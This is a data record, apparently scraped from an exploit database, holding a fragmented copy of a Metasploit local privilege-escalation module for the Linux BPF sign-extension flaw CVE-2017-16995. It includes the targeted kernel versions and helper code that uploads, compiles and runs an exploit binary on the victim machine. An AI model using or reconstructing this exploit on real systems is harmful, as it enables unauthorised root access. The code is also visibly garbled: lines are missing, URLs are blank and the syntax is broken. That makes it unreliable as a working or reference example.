{
    "text": "vul_name : Linux BPF Sign Extension Local Privilege Escalation ， vul_cve : CVE-2017-16995 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Linux BPF Sign Extension Local Privilege Escalation' ,  ， 'Description' => %q{ ， Linux kernel prior to 4.14.8 utilizes the Berkeley Packet Filter ( BPF )  ， which contains a vulnerability where it may improperly perform sign ， extension. This can be utilized to escalate privileges. ， The target system must be compiled with BPF support and must not have ， kernel.unprivileged_bpf_disabled set to 1. ， This module has been tested successfully on :  ， Debian 9.0 kernel 4.9.0-3-amd64 ;  ， Deepin 15.5 kernel 4.9.0-deepin13-amd64 ;  ， ElementaryOS 0.4.1 kernel 4.8.0-52-generic ;  ， Fedora 25 kernel 4.8.6-300.fc25.x86_64 ;  ， Fedora 26 kernel 4.11.8-300.fc26.x86_64 ;  ， Fedora 27 kernel 4.13.9-300.fc27.x86_64 ;  ， Gentoo 2.2 kernel 4.5.2-aufs-r ;  ， Linux Mint 17.3 kernel 4.4.0-89-generic ;  ， Linux Mint 18.0 kernel 4.8.0-58-generic ;  ， Linux Mint 18.3 kernel 4.13.0-16-generic ;  ， Mageia 6 kernel 4.9.35-desktop-1.mga6 ;  ， Manjero 16.10 kernel 4.4.28-2-MANJARO ;  ， Solus 3 kernel 4.12.7-11.current ;  ， Ubuntu 14.04.1 kernel 4.4.0-89-generic ;  ， Ubuntu 16.04.2 kernel 4.8.0-45-generic ;  ， Ubuntu 16.04.3 kernel 4.10.0-28-generic ;  ， Ubuntu 17.04 kernel 4.10.0-19-generic ;  ， ZorinOS 12.1 kernel 4.8.0-39-generic. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Jann Horn' ,  # Discovery ， 'bleidl' ,  # Discovery and get-rekt-linux-hardened.c exploit ， 'vnik' ,  # upstream44.c exploit ， 'rlarabee' ,  # cve-2017-16995.c exploit ， 'h00die' ,  # Metasploit ， 'bcoles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Nov 12 2017' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'AKA' , 'get-rekt-linux-hardened.c' ]  ,  ，  [ 'AKA' , 'upstream44.c' ]  ,  ，  [ 'BID' , '102288' ]  ,  ，  [ 'CVE' , '2017-16995' ]  ,  ，  [ 'EDB' , '44298' ]  ,  ，  [ 'EDB' , '45010' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' , %w [ Auto True False ]  ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， end ， upload path , data ， cmd_exec \"chmod +x ' # {path}'\" ， end ， upload \" # {path}.c\" , data ， gcc_cmd = \"gcc -o # {path} # {path}.c\" ， gcc_cmd = \"PATH= $ PATH : /usr/bin/ # {gcc_cmd}\" ， end ， output = cmd_exec gcc_cmd ， rm_f \" # {path}.c\" ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable.\" ， end ， cmd_exec \"chmod +x # {path}\" ， end ， path = : File.join Msf : Config.data_directory , 'exploits' , 'cve-2017-16995' , file ， fd = : File.open path , 'rb' ， data = fd.read fd.stat.size ， fd.close ， data ， end ， def live_compile? ， vprint_good 'gcc is installed' ， end ， unless datastore [ 'COMPILE' ] .eql? 'Auto' ， fail_with Failure : BadConfig , 'gcc is not installed. Compiling will fail.' ， end ， end ， def check ， arch = kernel_hardware ， unless arch.include? 'x86_64' ， vprint_error \"System architecture # {arch} is not supported\"",
    "time": "2018.07.19"
}